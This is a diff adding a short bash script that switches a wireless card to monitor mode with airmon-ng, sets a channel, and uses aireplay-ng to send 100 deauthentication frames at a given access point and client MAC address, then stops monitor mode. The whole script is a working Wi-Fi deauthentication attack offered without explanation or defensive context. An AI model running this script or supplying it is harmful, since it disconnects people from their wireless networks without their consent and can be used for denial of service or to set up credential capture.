@@ -1,0 +1,16 @@
+#!/bin/bash
+
+BSSID=$1
+targetMacAdress=$2
+channel=$3
+
+airmon-ng start wlan0
+ifconfig wlan0mon down
+iwconfig wlan0mon channel $channel
+ifconfig wlan0mon up
+xterm -e aireplay-ng -0 100 -a $BSSID -c $targetMacAdress wlan0mon
+#ifconfig wlan0mon down
+#iwconfig wlan0mon mode monitor
+#ifconfig wlan0mon up
+airmon-ng stop wlan0mon
+
